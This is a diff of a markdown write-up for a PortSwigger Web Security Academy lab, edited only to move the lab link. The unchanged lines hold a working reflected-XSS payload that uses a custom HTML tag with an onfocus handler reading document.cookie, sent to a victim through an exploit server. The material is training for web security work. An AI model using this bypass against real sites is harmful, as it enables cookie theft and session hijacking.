@@ -1,5 +1,7 @@
 # Reflected XSS into HTML context with all tags blocked except custom ones
 
+**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
+
 ## Metadata
 
 | Property | Value |
@@ -42,9 +44,3 @@ Then deliver it to victim via exploit server
 location="https://0a7200c504c0ae4a81962547000200ba.web-security-academy.net/?search=<my-tag+onfocus%3D'alert(document.cookie)'+id%3D'x'+tabindex%3D'1'>#x"
 </script>
 ```
-
-## PortSwigger Lab
-
-**Official lab:** Reflected XSS into HTML context with all tags blocked except custom ones
-
-**PortSwigger:** https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
